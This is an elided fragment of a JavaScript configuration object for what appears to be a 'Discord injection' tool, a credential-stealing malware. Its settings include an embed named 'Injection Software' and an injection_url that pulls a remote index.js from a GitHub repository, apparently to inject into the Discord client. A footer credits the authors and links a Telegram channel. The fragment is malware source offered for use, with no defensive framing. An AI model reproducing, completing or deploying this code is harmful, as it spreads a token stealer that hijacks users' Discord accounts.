...
const config = {
  ...
  ping_on_run: false, 
  ping_val: '',
  embed_name: 'Injection Software', 
  embed_icon: 'https://raw.githubusercontent.com/pipinstallme/injection/main/img/xd.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/pipinstallme/injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Pipinstallme & twisterSVB・https://t.me/pipinstallme',
        },
      },
    ],
  };
